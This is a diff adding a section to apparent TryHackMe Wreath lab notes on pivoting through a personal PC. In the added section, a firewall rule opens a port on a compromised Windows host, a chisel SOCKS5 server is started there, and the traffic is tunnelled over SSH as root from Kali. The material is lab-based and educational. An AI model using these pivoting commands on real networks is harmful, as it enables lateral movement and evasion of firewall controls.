@@ -211,7 +211,26 @@ closedPorts   : {}
 filteredPorts : {445, 443, 21, 23...}
 finishTime    : 30/01/2024 10:32:15
 
+<h2>Task 34  Personal PC Pivoting </h2>
+
+
+##On 10.200.85.150 run
+C:\Users\duke\Documents>netsh advfirewall firewall add rule name="duke2-MuirlandOracle" dir=in action=allow protocol=tcp localport=18001
+Ok.
+
+C:\Users\duke\Documents>.\chisel_1.9.1_win_amd64.exe server -p 18001 --socks5
+2024/01/31 09:23:00 server: Fingerprint X8owjaSez45pbyQA6djOuW72epShkSPuoYe27otyDzI=
+2024/01/31 09:23:00 server: Listening on http://0.0.0.0:18001
+2024/01/31 09:48:52 server: session#1: Client version (1.9.1-0kali1) differs from server version (1.9.1)
+
+
+┌──(duke㉿kali)-[~/Documents/THM_Wreath]
+└─$ ssh -L 18002:10.200.85.150:18001  -i root root@10.200.85.200 -N 
+and
+┌──(duke㉿kali)-[~]
+└─$ chisel client 127.0.0.1:18002 9090:socks
+2024/01/31 03:48:52 client: Connecting to ws://127.0.0.1:18002
+
 
 
 </code>
-
